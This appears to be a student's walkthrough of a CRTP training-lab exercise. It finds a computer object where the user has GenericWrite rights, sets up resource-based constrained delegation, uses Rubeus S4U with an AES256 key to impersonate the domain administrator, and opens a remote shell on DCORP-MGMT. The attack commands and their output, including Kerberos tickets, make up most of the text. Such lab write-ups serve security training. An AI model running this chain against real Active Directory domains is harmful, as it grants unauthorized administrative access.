# CRTP: Hands-On 17

```
  • Find a computer object in dcorp domain where we have Write permissions.
  • Abuse the Write permissions to access that computer as Domain Admin.
```

Index:

  1. [Computer with write permissions](#computer-with-write-permissions)
  2. [Abuse the write permissions](#abuse-the-write-permissions)


## Computer with write permissions

```
PS C:\Users\student162> Find-InterestingDomainAcl | ?{$_.identityreferencename -like '*ciadmin*'}


ObjectDN                : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ListChildren, ReadProperty, GenericWrite
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-719815819-3726368948-3917688648-1121
IdentityReferenceName   : ciadmin
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=ci admin,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : user


```

## Abuse the write permissions

```
PS C:\Users\Administrator\.jenkins\workspace\Project0> Set-DomainRBCD -Verbose -Identity dcorp-mgmt -DelegateFrom DCORP-STD162$
PS C:\Users\Administrator\.jenkins\workspace\Project0> Get-DomainRBCD -Verbose


SourceName                 : DCORP-MGMT$
SourceType                 : MACHINE_ACCOUNT
SourceSID                  : S-1-5-21-719815819-3726368948-3917688648-1108
SourceAccountControl       : WORKSTATION_TRUST_ACCOUNT
SourceDistinguishedName    : CN=DCORP-MGMT,OU=Servers,DC=dollarcorp,DC=moneycorp,DC=local
ServicePrincipalName       : {TERMSRV/DCORP-MGMT, TERMSRV/dcorp-mgmt.dollarcorp.moneycorp.local,
                             RestrictedKrbHost/DCORP-MGMT, HOST/DCORP-MGMT...}
DelegatedName              : DCORP-STD162$
DelegatedType              : MACHINE_ACCOUNT
DelegatedSID               : S-1-5-21-719815819-3726368948-3917688648-5182
DelegatedAccountControl    : WORKSTATION_TRUST_ACCOUNT
DelegatedDistinguishedName : CN=DCORP-STD162,OU=StudentMachines,DC=dollarcorp,DC=moneycorp,DC=local
```

Use Delegated Service for access to the target machine:

```
C:\Windows\system32>C:\AD\Tools\Rubeus.exe s4u /user:dcorp-std162$ /aes256:732b0bcff73f3658d123866dee2395b0085603cec814d990c9c04c461c7fb5a4 /msdsspn:http/dcorp-mgmt /impersonateuser:administrator /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: S4U

[*] Using aes256_cts_hmac_sha1 hash: 732b0bcff73f3658d123866dee2395b0085603cec814d990c9c04c461c7fb5a4
[*] Building AS-REQ (w/ preauth) for: 'dollarcorp.moneycorp.local\dcorp-std162$'
[*] Using domain controller: 172.16.2.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
      LmxvY2Fs


[*] Action: S4U

[*] Building S4U2self request for: 'dcorp-std162$@DOLLARCORP.MONEYCORP.LOCAL'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2self request to 172.16.2.1:88
[+] S4U2self success!
[*] Got a TGS for 'administrator' to 'dcorp-std162$@DOLLARCORP.MONEYCORP.LOCAL'
[*] base64(ticket.kirbi):

      doIGVzCCBlOgAwIBBaEDAgEWooIFQTCCBT1hggU5MIIFNaADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMohowGKADAgEBoREwDxsNZGNvcnAtc3RkMTYyJKOCBPIwggTuoAMCARKhAwIBAaKCBOAE
      ggTcs5/2Kuz0YwhG7lIFOdWVMVtig++oZgNGOh70yi+JT8XhwL2CBzdyPuAoHaxacOZAPlqGlf877TuK
      sJvHec5H7oajPIGeVyaOBqdMaR0Ezcdqf2gDV4GRcVEpzwjR01v9gIFjo0/SUW6nQ2bUw+6AxpnF2qWb
      CDz8szfRAobRepDFslnTGg6d8cXph9+alAf4HQTOW6lfxrxfCC8+CjmIwcF3tye2Zsbo4+qDPTJ6fDK+
      nIa4Evv3VjKiZ9geZCiSstqKewBLhbcvrIDp230At0Zrv09i9eCnnMR+uqS/2MiTEreC40F28UT2WhM/
      1Ie1LFN0b6H40O6ZKl9fCW7qVjheT9wTZ21g7P49mg9SPYS5ICS9i+xY2l/CzongS/V/tePrp4AlH5YR
      JdzJp9sPKrTs/UgHau+vHB1WInayi4VCpfbW1AtBK2jzjbyCeHbF+SVkl71dYv8uCACblCoLD16sUtyY
      A9k+ix7WJADgWh1vFqqdc9eOgK5FFQkhnxdg9ENoNSaswCmSrU3cWbVzL2TDk1ryJ7PmIdvyBDtriRBd
      grT4kE6U06JgmxDwW6F7SVAGOSd4MfDAj8fgYcTGiK/DQxnQKOZAp7vrycDQP7lZfeB3G8eSGs6+tAZ6
      qJ4T3jJAlUqk1H4YbFH7SZt9T0CibCZFJXOYJRnulKMmy+FCCrmF6JasKU0ghj3md/k8glBIOkG97wKy
      7A9qj7DWU90IzLA21DxxNpz+NjOs2KITnyQvHHP+74sMtWiLrntq0UWpbVEYKwC5ppOX2jh+X8pYFS7V
      LzLf3IRJdOBB6zqD1OHozzhLrdTFA+oma8xr202SWK9vacod2f/HTG0Fp0DxGpBnjaCnBWdDOPWw3+GV
      +w6F24CkOEpCLXlvk2Cq/wkYzixZRw7LVNkfvfdmCg+AhHzrYHX69k38gEmzNCYqx7iCGE5xPflmKTQ5
      TzLvp2nGFgLeO9dtJVnsx/eltUf2n/474425zquiI3st2HcWFJBF2HAgjnRn0x9DF/7fKl9OPPqKBrgm
      Tw28LoHSP9ZH9HtJM6mJGkWNMvoX/glTN6QT2fzMkKh5k2uzoJSZ2kghzGBgAHDepwCZ5e9QB/gULz1j
      YdRfwU4NqlE5x5br0iFAtn6rzomucVENXBm8md3yHETkBXjjPThmZ+4gRfHwTpiG5iiuhrYQidvVFqG3
      /80bIS78iR3Cp+O2krfESRqNQ36r4XptxDbT5JYX2TAcLHU3PIjqdMcKxRP52v/WEYrEhU9Beejf+LvJ
      p+zsaWsl5yLc5fhh+/43k191XY1/U5Ab5rb8nwehEmkcye2uPyq4cXIAD17snT+MioN+TIQKfXnHxVlP
      KSleiZRMTCrik+Xn2uoS9/22EhcHfRjewArbGzcHx6uN2gUcnFrVg1OqzUJ7AqaZjINxlhHI98xZ1NQi
      n7kR9LVMrzpXSQDwm9q9Pd208X1cZKGevD6PVvuMk6koiPIy99/K5NdOaIDJJTMPtGK8cn69GnIO+eoX
      QvF2uWfAszZOrGcdY5c4Vfu5KZoBsA0rog8PpxeMNnIb/iTU/nHA5KU9g/9CeA9w1NC2fTDw308XHrD3
      nAJJWmUQtnUOlX0DMCS3I6OVoayXEc+02tJAoWuIcSepldVbT6XASdk8BNcgX96jggEAMIH9oAMCAQCi
      gfUEgfJ9ge8wgeyggekwgeYwgeOgKzApoAMCARKhIgQgRpwqawMuBFbOjWYXUGR7PYLrxOGdHslEGjyM
      xlfMwuahHBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUyiGjAYoAMCAQqhETAPGw1hZG1pbmlzdHJh
      dG9yowcDBQBAoQAApREYDzIwMjMwNTAyMTg1MjM0WqYRGA8yMDIzMDUwMzA0NTIzNFqnERgPMjAyMzA1
      MDkxODUyMzRaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqRowGKADAgEBoREwDxsNZGNvcnAt
      c3RkMTYyJA==

[*] Impersonating user 'administrator' to target SPN 'http/dcorp-mgmt'
[*] Building S4U2proxy request for service: 'http/dcorp-mgmt'
[*] Using domain controller: dcorp-dc.dollarcorp.moneycorp.local (172.16.2.1)
[*] Sending S4U2proxy request to domain controller 172.16.2.1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'http/dcorp-mgmt':

      doIHBDCCBwCgAwIBBaEDAgEWooIF/DCCBfhhggX0MIIF8KADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlD
      T1JQLkxPQ0FMoh0wG6ADAgECoRQwEhsEaHR0cBsKZGNvcnAtbWdtdKOCBaowggWmoAMCARKhAwIBAaKC
      BZgEggWUSWbUfqa6GHxV7ZHXJGqSt8Wup8ksOO8dqvLjIfI8+/URY0FJYC7+YB0YWwsdRRlnKQBBPEId
      TKiyaUphETXF5Jmm4RL+yvDgRkYRJBNBtxLBoohUEFC/XWiOpUN/fTEho1t6brTHcQ4/ICS7DcBL1iN/
      9nQduDIAjZqK6m94dC3VAAgRFm+fUglv6TFHjenZZwBluISNxD8YDA8hLkq/Gcq+/cC6HCi5FzooSwD2
      5yVItZ1MSyzZhiUb74GsYkY+k2iiK+/b2TAR4rJTR9SivUJGH8uiNzO5BNCn+vfHTDgQwvcNnx0tmHBn
      ryK5ROkZQ/+idARSvedxXXPvy7IfNI/D3FIs0P+HnBrt3UL1FUYFyN4X04iBmIZPOvCE4neQfakZ2mX6
      FbrSn6iELZxUcjbBgtzNSYOwuHsETy+x+6xxvQHG7q04MDWIonxF5vnnB7gNlf4NzdCemhGPCUkfJYkm
      8OIFqd0aoNydyTRUMq+3q5SuKkJSvdgb0vvCU5uWVkRu5mnZEay00C44NCMx0PfUE/Hb3dyvc0Mlul25
      Jaiw79gMxCwmOZJdADATrCwvUNMy8ctOmFiAvlmjjZSFOaVpmnN2nVXzl74OGBGV8hBMY55Efq/jyyMF
      2Br2nknCvqCcIKSNnAhell+B050MjI4b/M16RWR1rhxZqpAGlxSZWj/bJNeM27Ocz2SKo8UjARg1jYrM
      byKrULeAJmejrI7gQoW9KUWYNq659zfwV3pc2db0ENFLwIhWDIdngzMP9Fo63uCFbFovRjNU/VMQ/WTz
      NnnVKLR1VlaXJtBVSFgqntQYmhbXaN1dNtJtQC74muteWuJHJkwSbl8/nUpAECwc7gbkdNz3AkQkyzW4
      73QfxCA93JUgWXWrqMy6faZs1wcHI55FmPTgSHfHZ0Ti5kUNMDYL4mEGaUKHRr2Y60SESzP3OaGXkLOT
      4HInRtLziaCA79Vh/8PLyafz3uIPmjrZf7dXe9i7d5zqRErXSqoCgWlhW6+NL5Xb1xw8handRe3uC9WA
      5kr4Z8vbwnt61h6vT2QKpw8vPsdJyh0sqMgYIKC9BbNE6/4GKEMHvoAcejVYo06eO/732PheSibjCZq7
      UqoT1g4xVgk3xjvItIeGIEjJ9tl2/co1RpwXOrTaEa+Jxmwa+ptL3gkv+msjJMKN3ln0ZwqrJ34i2sBn
      r6EgBT544iUORNc9IsvAV67gbh6tAd+p4flWWPFcNukrsv6jKgL7CWRw/iUgfDP9RnRwrpagMNg/9/+2
      3QhG0izMme2eg7rLBhHryVMJ8TL8ZUlyyzKKTyCFWRuxwB+iN8OrZAvK9HVRAmdBWQgX8/C4FEO4L2RS
      0Mx88TcPDiv7fRZIbvtni0QVhc3ZQJC3wvhw75RgBi9zavzv+ihsNhNszZJHzi0sJCymni48ObzEq00M
      Yek+88ghO87Rjc9ywNAvwLu2qfKDYgoHJ3kCHNN8PQw5+bMl9jZqegyTzDrB1aG7TyySxqUn12wR/n5k
      DtgU3oNPg+BBHmo/7WT/YPt1lBoT8cEsmpPE25cZ1sBF+L+9B7CVITvg159ZE1txHACqusQgC/pfXdw4
      UDNB71emokqmrdjzlfa0blOZ3z9Hhf4tiatqBey4L3rx2UW7qV4uhrjseElRFoX/KCPCMQcd98CkjnV1
      JsbSiS62wNapaCUS5EeYk6GZOLcaZtatsFYsZfJ0ZxWkMLWez80fmHxNkZG0ReBvIZdK6t+D9sOqc98s
      SIBPfFgqyf2Ul0z8396rU5CB+JQE5sJ5qtKd3h4/Vli2Bj6nqf9mQ2vsZ6rxZOwCzJKUNZVRsZjKHKiu
      waU+Tl6Anj4t0PXHtPL6KBi4G0p98OTm7W+PyTGnAp3+F755YJP1ME6uxgDkVJ0FXXc4aSYto4HzMIHw
      oAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARGhEgQQyMJjQS4hRDaeinJAGMZdeqEcGxpE
      T0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBCqERMA8bDWFkbWluaXN0cmF0b3KjBwMFAECh
      AAClERgPMjAyMzA1MDIxODUyMzRaphEYDzIwMjMwNTAzMDQ1MjM0WqcRGA8yMDIzMDUwOTE4NTIzNFqo
      HBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUypHTAboAMCAQKhFDASGwRodHRwGwpkY29ycC1tZ210
[+] Ticket successfully imported!

```
validate ticket:

```
C:\Windows\system32>klist

Current LogonId is 0:0x7bc1b51

Cached Tickets: (1)

#0>     Client: administrator @ DOLLARCORP.MONEYCORP.LOCAL
        Server: http/dcorp-mgmt @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 5/2/2023 11:52:34 (local)
        End Time:   5/2/2023 21:52:34 (local)
        Renew Time: 5/9/2023 11:52:34 (local)
        Session Key Type: AES-128-CTS-HMAC-SHA1-96
        Cache Flags: 0
        Kdc Called:

```


Access to the target machine:

```
C:\Windows\system32>winrs -r:dcorp-mgmt cmd
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\Administrator.dcorp>whoami
whoami
dcorp\administrator

C:\Users\Administrator.dcorp>hostname
hostname
dcorp-mgmt

C:\Users\Administrator.dcorp>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::a1f:6a04:7a2:71a1%6
   IPv4 Address. . . . . . . . . . . : 172.16.4.44
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.4.254
```
